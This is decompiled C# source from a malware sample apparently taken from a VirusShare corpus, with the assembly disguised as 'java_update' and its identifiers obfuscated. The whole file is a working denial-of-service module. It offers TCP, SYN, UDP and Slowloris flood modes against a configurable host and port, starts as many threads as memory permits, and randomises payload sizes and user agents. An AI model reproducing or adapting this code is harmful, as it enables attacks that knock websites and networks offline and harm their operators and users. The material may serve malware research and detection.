// Decompiled with JetBrains decompiler
// Type: ᏬĴவߙւ̞ᙘ.ḷ୵ኹසᐾᖑ֣ેᡎɉḡᚵځܲࣜᱣზआ
// Assembly: java_update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 557F7238-B13A-4798-94BE-2CA1CC027032
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-501fe6aaa92a5c9bad3bf6a1cdf6d5d77d5236bad8aca53c2ce66f490a365092.exe

using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ᏬĴவߙւ̞ᙘ
{
  internal class ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ
  {
    private static ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ᔜਃᷨෳُႌȼіูஶᶵҼ \u0EBBྲྀघ֘౨٣Бˇ\u1AF5\u0CF4Э;
    private static bool \u1C8Aජᘅహൠ\u1AA9ᵦւʊ̢بӑ;
    private static string দƭẏᯆᓭ;
    private static int ѢئᇬᣡਈC\u0DFEᥔᆺ\u0DC8პ௯;
    private static int \u0FC2ᵪцᬼየVᡊẇᠳᰟ\u0AB4\u0B98ॎ;
    private static int Ѹ\u02C2ҶӁف\u0608ᶆ;
    private static int \u096Eઝᐁ\u0BFD\u0BF6Ảŕ\u0BAC\u16FAწᙳᒮᑎ\u02F5\u055Fְ\u0BA6᭯ᯣ;
    private static ੴᴏ\u0AA9ࣸ᪃ỷᡀᄍ \u0B6Eेܸൈ\u00B9ᬼঅᚑഃआઝצ;
    private static string[] \u0FF7ᏻᣩܻ۪ᎠᣧᴲಇԥᤈᑥᏟ = new string[28]
    {
      "(compatible; MSIE 6.0; Windows NT)",
      "(Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5",
      "(Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1 ",
      "(MobilePhone SCP-5500/US/1.0) NetFront/3.0 MMP/2.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
      "[en] (WinNT; U)",
      "(compatible; MSIE 7.0; Windows NT 5.1; bgft) ",
      "(compatible; MSIE 6.0; Win32)",
      "(X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
      "(X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801",
      "(SunOS 5.8 sun4u; U) Opera 5.0 [en]",
      "(compatible; Googlebot/2.1; http://www.google.com/bot.html)  ",
      "(X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5 BAVM/1.0.0",
      "(X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8 ",
      "(Windows; U; Windows NT 6.1; it; rv:1.9.2) Gecko/20100115 Firefox/3.6",
      "Galeon/1.2.0 (X11; Linux i686; U;) Gecko/20020326",
      "(Windows NT 5.1; U; en) Presto/2.5.22 Version/10.50",
      "(Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
      "(X11; Linux x86_64; U; Linux Mint; en) Presto/2.2.15 Version/10.10",
      "(Macintosh; PPC Mac OS X; U; en) Opera 8.0",
      "(Windows; U; Windows NT 5.1; en-US; rv:0.9.6) Gecko/20011128",
      "(Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
      "(iPhone; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3",
      "(compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 4.0.20402; MS-RTC LM 8)",
      "(Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
      "(compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
      "(compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
      "(compatible; MSIE 6.1; Windows XP)",
      "(Windows; U; Windows NT 6.1; nl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3"
    };
    private static string[] ƃ\u1CA2ṅᡛ\u0A11\u0965ภ\u139C\u0027ͤڸୃ = new string[10]
    {
      "Mozilla/3.0 ",
      "Mozilla/3.1 ",
      "Mozilla/3.6 ",
      "Mozilla/4.0 ",
      "Mozilla/4.08 ",
      "Mozilla/5.0 ",
      "Opera/9.33 ",
      "Opera/9.0 ",
      "Opera/8.90 ",
      "Opera/9.80 "
    };

    public static ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ᔜਃᷨෳُႌȼіูஶᶵҼ ᣁໟଷୌࣼग᭘ => ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0EBBྲྀघ֘౨٣Бˇ\u1AF5\u0CF4Э;

    public static string \u1ABC\u0888Ἣ\u085D\u197Fज़\u1397ټ\u181E
    {
      get
      {
        switch (ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0EBBྲྀघ֘౨٣Бˇ\u1AF5\u0CF4Э)
        {
          case ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ᔜਃᷨෳُႌȼіูஶᶵҼ.\u02FBᅴḦТ\u0D70ᠣఙ\u0C04:
            return "TCP";
          case ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ᔜਃᷨෳُႌȼіูஶᶵҼ.\u192F\u0DFD\u0FEB\u008BᯁђᮛᏔ:
            return "SYN";
          case ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ᔜਃᷨෳُႌȼіูஶᶵҼ.\u0082\u1AE6ΦϋጮෟᙱኹϘᆣૡኊწ\u0090\u139E:
            return "UDP";
          case ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ᔜਃᷨෳُႌȼіูஶᶵҼ.\u0669ᯫᒵ᭄ᔴ\u0DD5:
            return "Slowloris";
          default:
            return (string) null;
        }
      }
    }

    public static bool ᎥޤᶮᏰ\u0DBFƐটভಐ\u066A\u19F0ᙚɡ => ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u1C8Aජᘅహൠ\u1AA9ᵦւʊ̢بӑ;

    public static void \u008B\u1ABF\u17F9ᘊᢼ᠘͊ᴵɔǜ\u0EFC\u086B(
      ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ᔜਃᷨෳُႌȼіูஶᶵҼ _param0,
      string _param1,
      int әឤ१ីᗺేᣤ̵ᗢḵᳫႄ್ƛԸូ,
      int _param3,
      int _param4,
      int _param5,
      ੴᴏ\u0AA9ࣸ᪃ỷᡀᄍ _param6)
    {
      ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0EBBྲྀघ֘౨٣Бˇ\u1AF5\u0CF4Э = _param0;
      ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.দƭẏᯆᓭ = _param1;
      ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ѢئᇬᣡਈC\u0DFEᥔᆺ\u0DC8პ௯ = әឤ१ីᗺేᣤ̵ᗢḵᳫႄ್ƛԸូ;
      ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0FC2ᵪцᬼየVᡊẇᠳᰟ\u0AB4\u0B98ॎ = _param3;
      ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u096Eઝᐁ\u0BFD\u0BF6Ảŕ\u0BAC\u16FAწᙳᒮᑎ\u02F5\u055Fְ\u0BA6᭯ᯣ = _param4;
      ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.Ѹ\u02C2ҶӁف\u0608ᶆ = _param5;
      ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0B6Eेܸൈ\u00B9ᬼঅᚑഃआઝצ = _param6;
      ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u1C8Aජᘅహൠ\u1AA9ᵦւʊ̢بӑ = false;
    }

    public static void \u173Dᄫ\u08B8\u0B65ᆅ\u08C9ᬻॳቺᕡḌ\u16EBៃᏗవɫ()
    {
      ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u1C8Aජᘅహൠ\u1AA9ᵦւʊ̢بӑ = true;
      new Thread(new ThreadStart(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u19D6ᴛᥜྛḢᒋᕋᔅṃ͝ၡᤔઃݤӜẤ)).Start();
    }

    public static void \u0AFE២Ⴊᱽᥢᜎᡜಂ\u1C39ኾضੰ\u0F1Dӿ() => ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u1C8Aජᘅహൠ\u1AA9ᵦւʊ̢بӑ = false;

    private static void \u19D6ᴛᥜྛḢᒋᕋᔅṃ͝ၡᤔઃݤӜẤ()
    {
      for (int index = 0; index < ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0FC2ᵪцᬼየVᡊẇᠳᰟ\u0AB4\u0B98ॎ; ++index)
      {
        try
        {
          new Thread(new ThreadStart(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0FAD\u166E\u07B8ᇻᐢḀ\u07F9\u0BA6\u0AFEủ\u1379ᔑछʥᇆ))
          {
            IsBackground = true
          }.Start();
        }
        catch (OutOfMemoryException ex)
        {
          ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0FC2ᵪцᬼየVᡊẇᠳᰟ\u0AB4\u0B98ॎ = index - 1;
          break;
        }
      }
    }

    private static void \u0FAD\u166E\u07B8ᇻᐢḀ\u07F9\u0BA6\u0AFEủ\u1379ᔑछʥᇆ()
    {
      int num = 0;
      while (ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u1C8Aජᘅహൠ\u1AA9ᵦւʊ̢بӑ && ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0B6Eेܸൈ\u00B9ᬼঅᚑഃआઝצ.\u0334ଢ଼ႉ\u0BFE1СᨲௗЇֶἀ\u0FD4គᏽࠏ៊ɤ࡙ӷ)
      {
        switch (ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0EBBྲྀघ֘౨٣Бˇ\u1AF5\u0CF4Э)
        {
          case ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ᔜਃᷨෳُႌȼіูஶᶵҼ.\u02FBᅴḦТ\u0D70ᠣఙ\u0C04:
            Socket socket1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket1.Blocking = false;
            while (num < ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u096Eઝᐁ\u0BFD\u0BF6Ảŕ\u0BAC\u16FAწᙳᒮᑎ\u02F5\u055Fְ\u0BA6᭯ᯣ && ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u1C8Aජᘅహൠ\u1AA9ᵦւʊ̢بӑ)
            {
              if (ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0B6Eेܸൈ\u00B9ᬼঅᚑഃआઝצ.\u0334ଢ଼ႉ\u0BFE1СᨲௗЇֶἀ\u0FD4គᏽࠏ៊ɤ࡙ӷ)
              {
                try
                {
                  socket1.Connect(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.দƭẏᯆᓭ, ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ѢئᇬᣡਈC\u0DFEᥔᆺ\u0DC8პ௯);
                  socket1.Send(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.Ⴜ\u17DBᭉ᱇\u0887ᬣőᢠẑɊઇÂƔᜂᙴ\u0A3Aᥗഛᕼ());
                  socket1.Close();
                  socket1 = (Socket) null;
                }
                catch
                {
                  socket1.Close();
                  break;
                }
                ++num;
                Thread.Sleep(1);
              }
              else
                break;
            }
            Thread.Sleep(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.Ѹ\u02C2ҶӁف\u0608ᶆ);
            break;
          case ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ᔜਃᷨෳُႌȼіูஶᶵҼ.\u192F\u0DFD\u0FEB\u008BᯁђᮛᏔ:
            Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket2.Blocking = false;
            try
            {
              socket2.BeginConnect(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.দƭẏᯆᓭ, ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ѢئᇬᣡਈC\u0DFEᥔᆺ\u0DC8პ௯, new AsyncCallback(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.è\u197DᗆϤᅶẗᤳᦦસਵᨆᦳͱ\u0C74), (object) null);
            }
            catch
            {
            }
            Thread.Sleep(100);
            try
            {
              if (socket2.Connected)
                socket2.Disconnect(false);
              socket2.Close();
            }
            catch
            {
            }
            Thread.Sleep(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.Ѹ\u02C2ҶӁف\u0608ᶆ);
            break;
          case ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ᔜਃᷨෳُႌȼіูஶᶵҼ.\u0082\u1AE6ΦϋጮෟᙱኹϘᆣૡኊწ\u0090\u139E:
            Socket socket3 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            socket3.Blocking = false;
            Socket socket4;
            try
            {
              socket3.Connect(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.দƭẏᯆᓭ, ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ѢئᇬᣡਈC\u0DFEᥔᆺ\u0DC8პ௯);
              while (num < ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u096Eઝᐁ\u0BFD\u0BF6Ảŕ\u0BAC\u16FAწᙳᒮᑎ\u02F5\u055Fְ\u0BA6᭯ᯣ && ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u1C8Aජᘅహൠ\u1AA9ᵦւʊ̢بӑ && ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0B6Eेܸൈ\u00B9ᬼঅᚑഃआઝצ.\u0334ଢ଼ႉ\u0BFE1СᨲௗЇֶἀ\u0FD4គᏽࠏ៊ɤ࡙ӷ)
              {
                socket3.Send(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0826པַ\u0BE0\u09FD\u17FDਖթᳲ());
                ++num;
                Thread.Sleep(1);
              }
              socket3.Close();
              socket4 = (Socket) null;
            }
            catch
            {
              socket3.Close();
              socket4 = (Socket) null;
              break;
            }
            Thread.Sleep(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.Ѹ\u02C2ҶӁف\u0608ᶆ);
            break;
          case ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ᔜਃᷨෳُႌȼіูஶᶵҼ.\u0669ᯫᒵ᭄ᔴ\u0DD5:
            Socket socket5 = (Socket) null;
            try
            {
              socket5 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
              socket5.Connect(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.দƭẏᯆᓭ, ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ѢئᇬᣡਈC\u0DFEᥔᆺ\u0DC8პ௯);
              socket5.Send(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.Ǧᙅ\u175Bᘰે());
              while (socket5.Connected)
              {
                if (ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u1C8Aජᘅహൠ\u1AA9ᵦւʊ̢بӑ)
                {
                  if (ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0B6Eेܸൈ\u00B9ᬼঅᚑഃआઝצ.\u0334ଢ଼ႉ\u0BFE1СᨲௗЇֶἀ\u0FD4គᏽࠏ៊ɤ࡙ӷ)
                  {
                    socket5.Send(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.Ǧᙅ\u175Bᘰે());
                    Thread.Sleep(2000);
                  }
                  else
                    break;
                }
                else
                  break;
              }
            }
            catch
            {
              socket5.Close();
            }
            Thread.Sleep(ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.Ѹ\u02C2ҶӁف\u0608ᶆ);
            break;
        }
        num = 0;
      }
      if (!ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u1C8Aජᘅహൠ\u1AA9ᵦւʊ̢بӑ)
        return;
      ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0AFE២Ⴊᱽᥢᜎᡜಂ\u1C39ኾضੰ\u0F1Dӿ();
    }

    private static void è\u197DᗆϤᅶẗᤳᦦસਵᨆᦳͱ\u0C74(IAsyncResult _param0)
    {
    }

    private static byte[] \u0826པַ\u0BE0\u09FD\u17FDਖթᳲ()
    {
      Random random = new Random();
      byte[] buffer = new byte[random.Next(1470, 65507)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] Ⴜ\u17DBᭉ᱇\u0887ᬣőᢠẑɊઇÂƔᜂᙴ\u0A3Aᥗഛᕼ()
    {
      Random random = new Random();
      byte[] buffer = new byte[random.Next(1470, (int) ushort.MaxValue)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] Ǧᙅ\u175Bᘰે()
    {
      Random random = new Random();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine("GET / HTTP/1.1");
      stringBuilder.AppendLine("Host: " + ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.দƭẏᯆᓭ);
      stringBuilder.AppendLine("User-Agent: " + ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ƃ\u1CA2ṅᡛ\u0A11\u0965ภ\u139C\u0027ͤڸୃ[random.Next(0, ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.ƃ\u1CA2ṅᡛ\u0A11\u0965ภ\u139C\u0027ͤڸୃ.Length - 1)] + " " + ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0FF7ᏻᣩܻ۪ᎠᣧᴲಇԥᤈᑥᏟ[random.Next(0, ḷ\u0B75ኹසᐾᖑ֣ેᡎɉḡᚵځܲ\u08DCᱣზआ.\u0FF7ᏻᣩܻ۪ᎠᣧᴲಇԥᤈᑥᏟ.Length - 1)]);
      stringBuilder.AppendLine("Content-Length: " + random.Next(1, 1000).ToString());
      stringBuilder.AppendLine("X-a: " + random.Next(1, 10000).ToString());
      stringBuilder.Append("Connection: keep-alive");
      return Encoding.ASCII.GetBytes(stringBuilder.ToString());
    }

    public enum ᔜਃᷨෳُႌȼіูஶᶵҼ
    {
      \u02FBᅴḦТ\u0D70ᠣఙ\u0C04,
      \u192F\u0DFD\u0FEB\u008BᯁђᮛᏔ,
      \u0082\u1AE6ΦϋጮෟᙱኹϘᆣૡኊწ\u0090\u139E,
      \u0669ᯫᒵ᭄ᔴ\u0DD5,
    }
  }
}
